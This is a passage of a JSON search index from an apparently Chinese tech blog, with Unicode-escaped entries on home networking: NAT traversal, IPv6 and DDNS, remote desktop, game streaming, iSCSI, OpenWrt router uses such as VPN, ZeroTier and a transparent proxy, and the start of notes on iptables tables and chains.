<p>udp\u6253\u6d1e\uff0c\u8fd9\u79cd\u6bd4\u8f83\u9ad8\u7ea7\uff0c\u6d89\u53ca\u5230NAT\u7684\u539f\u7406\u3002\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u9700\u8981\u5176\u4e2d\u4e00\u4e2a\u8bbe\u5907\u6709\u516c\u7f51ip\u3002\u6ca1\u6709\u7684\u8bdd\uff0c\u5219\u9700\u8981\u670d\u52a1\u5668C\u8fdb\u884c\u521d\u59cb\u5316\u8fde\u63a5\uff0c\u6253\u6d1e\u6210\u529f\u540e\uff0cA\u76f4\u63a5\u8bbf\u95eeB\u4e0d\u9700\u8981C\u7684\u8f6c\u53d1\uff0c\u56e0\u6b64\u8bbf\u95ee\u5e26\u5bbd\u4e0d\u4f1a\u88abC\u7684\u5e26\u5bbd\u9650\u5236</p> <p>\u7f3a\u70b9\uff1audp\u6253\u6d1e\u5bf9NAT\u7c7b\u578b\u6709\u8981\u6c42\uff0c\u5e76\u975e\u6240\u6709NAT\u7c7b\u578b\u90fd\u80fd\u6253\u6d1e\u6210\u529f</p> <p>ps. \u8bb8\u591aP2P\u5de5\u5177\uff0c\u8054\u673a\u6e38\u620f\uff0c\u90fd\u4f1a\u4f7f\u7528\u8be5\u6280\u672f</p> </li> </ul> <p>\u8fd9\u91cc\u68b3\u7406\u4e86\u4e00\u4e0b\u4e0d\u540c\u7f51\u7edc\u60c5\u51b5\u4e0b\u5185\u7f51\u7a7f\u900f\u65b9\u5f0f{% post_link \u4e0d\u540c\u60c5\u51b5\u4e0b\u7684\u5185\u7f51\u7a7f\u900f %}</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u57fa\u7840","title":"\u57fa\u7840","text":"<p>\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531\u7684\u57fa\u7840\u4fbf\u662f\u6bcf\u53f0\u8bbe\u5907\u90fd\u80fd\u83b7\u5f97\u4e00\u4e2a\u516c\u7f51\u7684ip\uff0cipv6\u4f7f\u6211\u4eec\u80fd\u505a\u5230\u8fd9\u4e00\u70b9</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5f00\u542fipv6","title":"\u5f00\u542fipv6","text":"<ul> <li>\u5bf9\u4e8e\u5bb6\u91cc\u63a5\u5165\u4e86\u5bbd\u5e26\u7684\u60c5\u51b5\uff0c\u5404\u5927\u8fd0\u8425\u5546\u57fa\u672c\u90fd\u652f\u6301ipv6\uff0c\u4f46\u4e0d\u4e00\u5b9a\u5f00\u542f\u4e86\u3002\u9700\u8981\u5728\u5149\u732b\u91cc\u8bbe\u7f6e</li> <li>\u79fb\u52a8\u5149\u732b\u5f00\u542fipv6\u6559\u7a0b{% post_link \u79fb\u52a8\u5149\u732b\u5f00\u542fipv6 %}</li> <li>\u5bf9\u4e8e\u5b66\u6821\u8fde\u63a5\u6821\u56ed\u7f51\u7684\u60c5\u51b5\uff0c\u6821\u56ed\u7f51\u9664\u4e86\u63a5\u5165\u51e0\u5927\u8fd0\u8425\u5546\uff0c\u8fd8\u53ef\u80fd\u63a5\u5165\u6559\u80b2\u7f51\uff0c\u4e00\u822c\u90fd\u652f\u6301ipv6\u3002\u6b64\u65f6\u5728\u8def\u7531\u5668\u76f8\u5173\u9009\u9879\u91cc\u6253\u5f00ipv6\u5373\u53ef\u3002</li> <li>\u5bf9\u4e8e\u8def\u7531\u5668\u4e3aopenwrt\u7684\u60c5\u51b5\uff0c\u914d\u7f6eipv6\u6559\u7a0bopenwrt\u914d\u7f6e#ipv6</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#ddns","title":"DDNS","text":"<p>\u867d\u7136ipv6\u662f\u5f97\u6bcf\u4e2a\u8bbe\u5907\u6709\u4e86\u516c\u7f51ip\uff0c\u4f46\u662f\u6709\u4e24\u4e2a\u95ee\u9898\uff1a</p> <ul> <li>\u76ee\u524dipv6\u6709\u6709\u72b6\u6001\u7684\u5206\u914d\u534f\u8baeDHCP\uff0c\u4e5f\u6709\u65e0\u72b6\u6001\u7684SLAAC\u534f\u8bae\uff0c\u5206\u914d\u7684ip\u5730\u5740\u53ef\u80fd\u53d1\u751f\u53d8\u5316\u3002</li> <li>ipv6\u5730\u5740\u6709128bit\uff0c\u592a\u957f\u4e86\u4e0d\u5bb9\u6613\u8bb0\u5fc6</li> </ul> <p>\u89e3\u51b3\u4ee5\u4e0a\u95ee\u9898\u7684\u65b9\u5f0f\u4fbf\u662f\u5c06ipv6\u7ed1\u5b9a\u5230\u4e00\u4e2a\u57df\u540d\u4e0a\u3002</p> <p>FreeDNS\u548copenwrt\u914d\u7f6e\u4ecb\u7ecdopenwrt\u914d\u7f6e#DDNS</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u73a9\u6cd5","title":"\u73a9\u6cd5","text":"","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u8fdc\u7a0b\u684c\u9762","title":"\u8fdc\u7a0b\u684c\u9762","text":"<p>\u4f7f\u7528windows\u81ea\u5e26\u7684\u201c\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u201d\uff0c\u4fbf\u53ef\u4ee5\u8fdc\u7a0b\u8fde\u63a5\u5230\u5176\u4ed6windows\u8ba1\u7b97\u673a\u3002\u4e0d\u53ea\u662f\u7535\u8111\uff0c\u624b\u673a\u5e73\u677f\u7b49\u5e73\u53f0\u4e5f\u5747\u53ef\u4e0b\u8f7drdp\u8f6f\u4ef6\u8fde\u63a5\u5230windows\u3002</p> <p>ps. 1. \u670d\u52a1\u7aef\u9700\u8981\u5f00\u542f\u8fdc\u7a0b\u8fde\u63a5\u670d\u52a1\uff0c\u9700\u8981windows\u4e13\u4e1a\u7248\uff0c\u4f46\u662fgithub\u4e0a\u6709\u5bb6\u5ead\u7248\u5f00\u542f\u7684\u65b9\u6cd5\u30022. linux\u548cwindows\u4e5f\u53ef\u901a\u8fc7rdp\u534f\u8bae\u76f8\u4e92\u8fde\u63a5</p> <p>\u7528\u4f8b\uff1a</p> <ul> <li> <p>\u8ba1\u7b97\u673a\u4e13\u4e1a\u53bb\u673a\u623f\u505a\u5b9e\u9a8c\u65f6\uff0c\u76f4\u63a5\u5728\u673a\u623f\u7535\u8111\u4e0a\u8fdc\u7a0b\u8fde\u63a5\u5230\u5bdd\u5ba4/\u5b9e\u9a8c\u5ba4\u7535\u8111</p> </li> <li> <p>\u56de\u5bb6\u65f6\u53f0\u5f0f\u673a\u642c\u4e0d\u56de\u5bb6\uff1f\u5c06\u53f0\u5f0f\u642c\u5230\u5b9e\u9a8c\u5ba4\uff08\u4e0d\u4f1a\u65ad\u7535\uff09\uff0c\u5728\u5bb6\u8fdc\u7a0b\u5f00\u673a\uff0c\u518d\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u529e\u516c\u3002</p> </li> <li>\uff08\u4eb2\u8eab\u7ecf\u5386\uff09\u67d0\u6b21\u82f1\u8bed\u505apresentation\u65f6\uff0c\u6559\u5ba4\u7684\u7535\u8111\u8bc6\u522b\u4e0d\u4e86\u81ea\u5df1\u7684U\u76d8\uff0c\u76f4\u63a5\u8fdc\u7a0b\u8fde\u63a5\u5bbf\u820d\u7684\u7535\u8111\uff0c\u5c06\u6587\u4ef6\u590d\u5236\u5230\u6559\u5ba4\u7684\u7535\u8111\u4e2d\u3002\uff08\u6709\u70b9cool\uff09</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u4e91\u6e38\u620f","title":"\u4e91\u6e38\u620f","text":"<p>\u51e0\u4e2a\u4e32\u6d41\u8f6f\u4ef6</p> <ul> <li>SteamLink\uff1a\u53ea\u8981\u6709steam\u5c31\u53ef\u4ee5\u4e32\u6d41\uff0c\u6548\u679c\u4e0d\u9519</li> <li>AMD Link\uff1a\u8bd5\u8fc7\u5185\u7f51\u4e32\u6d41\uff0c\u611f\u89c9\u5dee\u4e0d\u591a\u3002\u6ca1\u5b9e\u73b0\u6210\u529f\u5916\u7f51\u4e32\u6d41</li> <li>moonlight(NV)\uff1a\u57fa\u4e8eNV\u7684Sheild\u5b9e\u73b0\u7684\u5f00\u6e90\u7248\u672c\uff0c\u636e\u8bf4\u6548\u679c\u5f88\u597d</li> </ul> <p>\u4eb2\u8eab\u7ecf\u5386\uff0c\u8001\u5bb6\u6c5f\u897f\u4e50\u5e73\uff08100M\u79fb\u52a8\u5bbd\u5e26\uff09\uff0c\u53f0\u5f0f\u673a\u4f4d\u4e8e\u5b89\u5fbd\u5408\u80a5\u5b66\u6821\u5b9e\u9a8c\u5ba4\uff081000M\u6559\u80b2\u7f51\uff09\uff0c\u4f7f\u7528ipv6\u8fde\u63a5(\u4f7f\u7528\u4e86wireguard VPN\u8fde\u63a5\u5230\u5b66\u6821)\uff0c\u4f7f\u7528SteamLink\u7eda\u4e3d\u6a21\u5f0f\uff08\u6700\u597d\u753b\u8d28\uff09\uff0c\u73a9\u602a\u7269\u730e\u4eba\u4e16\u754c\uff0c\u5ef6\u8fdf\u53ef\u4ee5\u7a33\u5b9a\u572820-30ms\u4e4b\u95f4\uff0c\u5b8c\u5168\u4e0d\u5361\uff08\u5982\u679c\u6ce2\u52a8\u523060ms\u5c31\u4f1a\u5361\uff0c20-30ms\u5c5e\u4e8e\u6548\u679c\u5f88\u597d\u7684\u60c5\u51b5\uff09</p> <p>\u4e0d\u8fc7\u4e5f\u6709\u4e00\u4e9b\u5c0f\u95ee\u9898\uff1a</p> <ul> <li>\u753b\u9762\u6709\u65f6\u4f1a\u51fa\u73b0\u8bb8\u591a\u9a6c\u8d5b\u514b\uff0c\u6216\u8005\u6709\u65f6\u6574\u4f53\u50cf\u662f\u52a0\u4e0a\u4e86\u4e00\u4e2a\u6ee4\u955c\uff0c\u504f\u7d2b\u3002\u611f\u89c9\u662fudp\u6570\u636e\u4f20\u8f93\u9519\u8bef\u5bfc\u81f4\u7684\u3002\u6216\u8005\u662fsteamLink\u7684\u95ee\u9898\uff1f</li> <li>steamlink\u53ea\u6709\u624b\u673a\u5e73\u677f\u7aef\u652f\u6301HEVC\u7f16\u7801\uff0c\u5176\u4f59\u5747\u53ea\u652f\u6301h264\u7f16\u7801\u3002\u4e0d\u77e5\u9053\u6362\u7528\u7f16\u7801\u80fd\u4e0d\u80fd\u89e3\u51b3\u4e0a\u9762\u7684\u753b\u9762\u95ee\u9898\u3002\uff08\u5e73\u677f\u7684typec\u7ecf\u8f6c\u63a5\u540e\u662f\u53ef\u4ee5\u8fde\u63a5\u7f51\u7ebf\u7684\uff0c\u518d\u6b21\u5c1d\u8bd5\u540e\u4ecd\u7136\u51fa\u73b0\u4e86\u4e0a\u9762\u95ee\u9898\uff0c\u4e0d\u8fc7\u611f\u89c9\u597d\u50cfSteamLink\u5e76\u6ca1\u6709\u5f00\u542fh265\u7f16\u7801\uff0c\u4fe1\u606f\u680f\u4ecd\u663e\u793a\u53f0\u5f0f\u673a\u5728\u4f7f\u7528x264\u8fdb\u884c\u7f16\u7801\uff09</li> <li>\u53f0\u5f0f\u673a\u4f7f\u7528\u7684\u663e\u5361\u4e3aRX550\uff0c\u6027\u80fd\u5f88\u5f31\u3002\u4e32\u6d41\u65f6\uff0c\u7f16\u7801\u4f7f\u7528\u4e86CPU\u7f16\u7801\uff0c\u56e0\u6b64\u5bf9\u6027\u80fd\u7a0d\u7a0d\u9020\u6210\u4e86\u4e00\u70b9\u5f71\u54cd\u3002</li> <li>\u603b\u4e4b\uff0c\u611f\u89c9\u7528\u82f1\u4f1f\u8fbe\u7684\u786c\u4ef6+moonlight\u53ef\u80fd\u6548\u679c\u4f1a\u66f4\u597d\u3002</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5bb6\u5ead\u5f71\u9662","title":"\u5bb6\u5ead\u5f71\u9662","text":"<p>\u5728\u7535\u8111\u4e0a\u4e0b\u8f7d\u597d\u9ad8\u6e05\u89c6\u9891\uff0c\u5f00\u542fSMB\u5171\u4eab\uff0c\u5728\u5b89\u5353\u7535\u89c6\u4e0a\u5b89\u88c5kodi\u8f6f\u4ef6\uff0c\u901a\u8fc7ipv6\u6dfb\u52a0\u7535\u8111\u3002\u7535\u89c6\u5c31\u53ef\u4ee5\u76f4\u63a5\u64ad\u653e\u7535\u8111\u89c6\u9891\u4e86\uff0c\u800c\u4e14Kodi\u4f5c\u4e3a\u4e00\u4e2a\u524d\u7aef\u8f6f\u4ef6\uff0c\u8fd8\u6709\u8bb8\u591a\u529f\u80fd\uff0c\u6bd4\u5982\u81ea\u52a8\u626b\u63cf\u6587\u4ef6\uff0c\u6dfb\u52a0\u7535\u5f71\u5c01\u9762\u3001\u7b80\u4ecb\u4e4b\u7c7b\u7684\u3002</p> <p>\u5b9e\u9645\u64cd\u4f5c{% post_link \u5c0f\u7c73\u7535\u89c6\u8bbf\u95ee\u7535\u8111\u89c6\u9891 %}</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#iscsi\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8","title":"iSCSI\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u5c06\u67d0\u4e2a\u8bbe\u5907\u4e0a\u7684\u78c1\u76d8\u6302\u8f7d\u5230\u522b\u7684\u7535\u8111\u4e0a</p> <p>\u5bf9\u4e8e\u5ba2\u6237\u7aef\u6765\u8bf4\uff0c\u6302\u8f7d\u7684\u76d8\u548c\u5176\u4ed6\u76d8\u4e00\u6837\uff0c\u53ef\u4ee5\u5b89\u88c5\u8f6f\u4ef6\u3002\u7ecf\u6d4b\u8bd5\uff0c\u867d\u7136\u6e38\u620f\u52a0\u8f7d\u5ef6\u8fdf\u786e\u5b9e\u53d7\u5230\u7f51\u7edc\u5e26\u5bbd\u5f71\u54cd\u3002\u4f46\u662f\u662f\u771f\u7684\u53ef\u4ee5\u6253\u6e38\u620f\u7684\uff0c\u5373\u4f7f\u662f\u8fd0\u884c50GB\u7684MHW\u6548\u679c\u4e5f\u975e\u5e38\u7684\u597d\uff0c\u751a\u81f3\u6ca1\u6709\u611f\u89c9\u5230\u52a0\u8f7d\u5ef6\u8fdf\u3002</p> <p>\u7528\u4f8b\uff1a</p> <ul> <li>\u8001\u7b14\u8bb0\u672c\u4e0d\u600e\u4e48\u7528\u4e86\uff0c\u4f46\u662f\u4e0d\u60f3\u6d6a\u8d39\u4e0a\u9762\u76841TB\u78c1\u76d8\uff1f\u88c5\u4e0aLinux\uff0c\u5c06\u78c1\u76d8\u4f5c\u4e3aiSCSI server\u5206\u4eab\u51fa\u53bb\u3002</li> <li>\u8f7b\u8584\u672c\u4ec5\u6709500G\u56fa\u6001\u4e14\u65e0\u6cd5\u6269\u5c55\uff1f\u6302\u8f7d\u4e0a\u5176\u4ed6\u8bbe\u5907\u4e0a\u76841TB\u78c1\u76d8\uff0c\u76f4\u63a5\u89e3\u653e\u3002</li> <li>\u5728\u4e00\u4e2a\u78c1\u76d8\u4e0a\u5b89\u88c5\u597d\u6e38\u620f\uff0c\u81ea\u5df1\u7684\u8bbe\u5907\u5e26\u4e0d\u52a8\uff0c\u4e0b\u6b21\u8e6d\u4e00\u4e0b\u522b\u4eba\u7684\u7535\u8111\uff0c\u7528\u522b\u4eba\u7684\u7535\u8111\u6765\u73a9</li> </ul> <p>\u8bbe\u7f6e\u65b9\u6cd5\u53c2\u8003{% post_link \u7f51\u7edc\u6302\u8f7d\u78c1\u76d8(iSCSi) %}</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u8def\u7531\u5668\u73a9\u6cd5","title":"\u8def\u7531\u5668\u73a9\u6cd5","text":"","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#openwrt\u5237\u673a","title":"openwrt\u5237\u673a","text":"<p>\u4ee5\u4e0b\u8def\u7531\u5668\u73a9\u6cd5\u5747\u9700\u8981\u6709\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u5e76\u4e14\u9700\u8981\u5237\u6210\u7b2c\u4e09\u65b9\u7cfb\u7edf\uff0c\u63a8\u8350openwrt\u7cfb\u7edf\u3002</p> <ul> <li> <p>\u5237openwrt\u53c2\u8003\uff1a{% post_link openwrt\u5237\u673a %}</p> </li> <li> <p>\u5982\u679c\u6709\u9700\u8981\uff0c\u8fd8\u53ef\u4ee5\u53c2\u8003\u5982\u4f55\u81ea\u5df1\u7f16\u8bd1openwrt\u56fa\u4ef6\uff1a{% post_link openwrt\u7f16\u8bd1 %}</p> </li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u8fdc\u7a0b\u5f00\u673a","title":"\u8fdc\u7a0b\u5f00\u673a","text":"<p>\u4f7f\u7528\u7f51\u7edc\u5524\u9192WOL(wake on LAN)\u65b9\u5f0f\u5bf9\u7535\u8111\u8fdb\u884c\u5f00\u673a\u3002\u6bd4\u5982\u8fdc\u7a0b\u5c06\u5b9e\u9a8c\u5ba4\u7684\u53f0\u5f0f\u673a\u5f00\u673a\uff0c\u7136\u540e\u8fdb\u884c\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u3002</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5b9a\u65f6\u811a\u672c","title":"\u5b9a\u65f6\u811a\u672c","text":"<p>\u5728\u8def\u7531\u5668\u4e0a\u4f7f\u7528crontab\u5b9a\u65f6\u8fd0\u884c\u811a\u672c\uff0c\u6bd4\u5982\u4f7f\u7528python\u81ea\u52a8\u8fdb\u884c\u7b7e\u5230\u3001\u62a2\u8bfe\u3002</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#vpn","title":"VPN","text":"<p>\u4f7f\u7528VPN\u53ef\u4ee5\u5728\u5916\u5730\u8bbf\u95ee\u5185\u7f51\u3002\u6bd4\u5982\u653e\u5047\u56de\u5bb6\uff0c\u901a\u8fc7VPN\u8fde\u63a5\u5230\u5b66\u6821\u7684\u8def\u7531\u5668\uff0c\u7136\u540e\u53ef\u4ee5\u8bbf\u95ee\u6821\u5185\u8d44\u6e90\u3002</p> <ul> <li>openwrt\u914d\u7f6ewiregurad\u65b9\u6cd5\u53c2\u8003\uff1aopenwrt\u914d\u7f6e#Wireguard</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5185\u7f51\u7a7f\u900f","title":"\u5185\u7f51\u7a7f\u900f","text":"<p>\u5916\u7f51\u8bbf\u95ee\u8def\u7531\u5668\u5185\u7f51\u8bbe\u5907</p> <ul> <li>zerotier\uff1a\u6700\u7b80\u5355\u7684\u5185\u7f51\u7a7f\u900f\u5de5\u5177\uff0c\u9700\u8981\u6ce8\u518czerotier\u8d26\u53f7\uff0czerotier\u4f1a\u5c1d\u8bd5\u4f7f\u8bbe\u5907\u95f4\u76f4\u63a5\u8fde\u63a5\uff0c\u4e0d\u884c\u5219\u4f7f\u7528zerotier\u670d\u52a1\u5668\u8f6c\u53d1\uff08\u7ed9\u7684\u5e26\u5bbd\u4e5f\u5f88\u9ad8\uff09\u3002</li> <li>openwrt\u914d\u7f6ezerotier\u65b9\u6cd5\u53c2\u8003\uff1aopenwrt\u914d\u7f6e#ZeroTier</li> <li>wiregurad\u505aVPN\u540c\u65f6\uff0c\u4e5f\u53ef\u4ee5\u8fdb\u884c\u5185\u7f51\u7a7f\u900f</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u900f\u660e\u4ee3\u7406","title":"\u900f\u660e\u4ee3\u7406","text":"<p>\u5728\u8def\u7531\u5668\u4e0a\u8fd0\u884c\u4ee3\u7406\u8f6f\u4ef6\uff0c\u5982ssr, clash\u3002\u4ece\u800c\u5b9e\u73b0\u8fde\u63a5\u5230\u8be5\u8def\u7531\u5668\u4e0a\u7684\u8bbe\u5907\u5747\u53ef\u79d1\u5b66\u4e0a\u7f51\uff0c\u800c\u4e0d\u7528\u8fdb\u884c\u4efb\u4f55\u989d\u5916\u8bbe\u7f6e\u3002</p> <ul> <li>openwrt\u914d\u7f6e\u900f\u660e\u4ee3\u7406\u65b9\u6cd5\u53c2\u8003\uff1aopenwrt\u914d\u7f6e#\u900f\u660e\u4ee3\u7406</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5c0f\u578bnas","title":"\u5c0f\u578bNAS","text":"<p>\u5bf9\u4e8e\u6709USB\u63a5\u53e3\u7684\u8def\u7531\u5668\uff0c\u53ef\u4ee5\u63a5\u4e0a\u4e00\u5757\u79fb\u52a8\u786c\u76d8\uff08\u6216\u8005\u5145\u5206\u5229\u7528\u4f60\u7684U\u76d8:-)\uff09\u6765\u4f5c\u4e3a\u4e00\u4e2a\u6587\u4ef6\u5b58\u50a8\u5668\u3002</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5176\u4ed6\u7f51\u7edc\u5de5\u5177","title":"\u5176\u4ed6\u7f51\u7edc\u5de5\u5177","text":"","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#barrier","title":"barrier","text":"<ul> <li>debauchee/barrier: Open-source KVM software (github.com)</li> </ul> <p>\u4e00\u6b3e\u5f00\u6e90\u514d\u8d39\u7684\u952e\u9f20\u5171\u4eab\u5de5\u5177\uff0c\u901a\u8fc7\u7f51\u7edc\u4f7f\u4e00\u5957\u952e\u9f20\u53ef\u4ee5\u63a7\u5236\u591a\u4e2a\u8bbe\u5907\uff0c\u5e76\u4e14\u8fd8\u652f\u6301\u526a\u5207\u677f\uff0c\u6587\u4ef6\u62d6\u52a8\u7b49\u529f\u80fd\u3002\u5728windows\u548clinux\u4e0a\u5747\u53ef\u4f7f\u7528\u3002</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/","title":"iptables","text":"<p>iptables</p> <p>iptables is a command line utility for configuring Linux kernel firewall implemented within the Netfilter project. - iptables\u662flinux\u4e0a\u7684\u9632\u706b\u5899\u8f6f\u4ef6 - \u6709\u4e00\u4e9b\u5de5\u5177\u4f5c\u4e3aiptables\u7684\u524d\u7aef\uff0c\u547d\u4ee4\u66f4\u52a0\u7b80\u5355\u6216\u8005\u6709GUI\uff08\u5982ufw\u548cgufw\uff09 - Note: iptables is a legacy framework, nftables aims to provide a modern replacement including a compatibility layer.</p>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u539f\u7406","title":"\u539f\u7406","text":"","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#flow-chart","title":"Flow chart","text":"<p>\u5f53\u4e00\u4e2a\u7f51\u7edc\u63a5\u53e3\u4e0a\u63a5\u53d7\u5230\u4e00\u4e2a\u5305\u540e\uff0c\u5185\u6838\u4f1a\u5bf9\u5176\u8fdb\u884c\u4e00\u7cfb\u5217\u5904\u7406\u3002</p> <p>When a packet first enters the firewall, it hits the hardware and then gets passed on to the proper device driver in the kernel. Then the packet starts to go through a series of steps in the kernel, before it is either sent to the correct application (locally), or forwarded to another host - or whatever happens to it.</p> <p></p> <p>) - \u6bcf\u4e00\u4e2aIP\u5305\uff0c\u65e0\u8bba\u6765\u81ea\u54ea\u4e00\u4e2a\u7f51\u7edc\u63a5\u53e3(network interface)\uff0c\u90fd\u4f1a\u6309\u7167\u8be5\u6d41\u56fe\u5904\u7406 - \u5927\u81f4\u5206\u4e3a3\u79cd\u60c5\u51b5   - \u5305\u7684\u76ee\u7684\u662f\u672c\u673a\u7684\u67d0\u4e2a\u8fdb\u7a0b\uff1aPREROUTING --&gt; INPUT --&gt; Local Process   - \u5982\u679c\u672c\u5730\u8fdb\u7a0b\u4ea7\u751f\u4e00\u4e2a\u5305\uff0c\u4e5f\u9700\u8981\u4e00\u7cfb\u5217\u5904\u7406\u5c06\u5176\u53d1\u9001\u5230\u67d0\u4e2a\u63a5\u53e3\u4e0a\uff1aOUTPUT --&gt; POSTROUTING   - \u5982\u679c\u5305\u7684\u76ee\u7684\u5730\u5740\u4e0d\u662f\u672c\u673a\uff0c\u5219\u9700\u8981\u8fdb\u884c\u8f6c\u53d1\uff1aPREROUTING --&gt; FORWARD --&gt;  POSTROUTING</p>","tags":["iptables"]},{"location":"%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#tables","title":"Tables","text":"<p>\u9ed8\u8ba4\u5b9e\u73b0\u4e864\u8868\u30015\u94fe</p> <p></p> <ul> <li>raw\uff1a\u7528\u4e8e\u5728\u5176\u4ed6\u8868\u4e4b\u524d\u8fdb\u884c\u64cd\u4f5c\uff0c\u53ef\u4ee5\u907f\u514dconnection tracking</li> <li>filter\uff1a\u4e13\u95e8\u7528\u4e8efiltering packets\uff0c\u5982\u8fdb\u884cDROP, LOG, ACCEPT or REJECT</li> <li>nat\uff1a\u7528\u4e8e\u7f51\u7edc\u5730\u5740\u8f6c\u6362\uff0c\u5982\u7aef\u53e3\u8f6c\u53d1</li> <li>\u4e0d\u5e94\u8be5\u5728nat table\u4e0a\u8fdb\u884cfilter\uff0c\u56e0\u4e3anat\u53ea\u4f1a\u5bf9\u4e00\u4e2a\u6d41\u4e2d\u7684\u7b2c\u4e00\u4e2apacket\u8fdb\u884c\u5904\u7406\uff0c\u5176\u5b83\u7684\u5305\u5df2\u7ecf\u6ca1\u6709\u4e86TCP 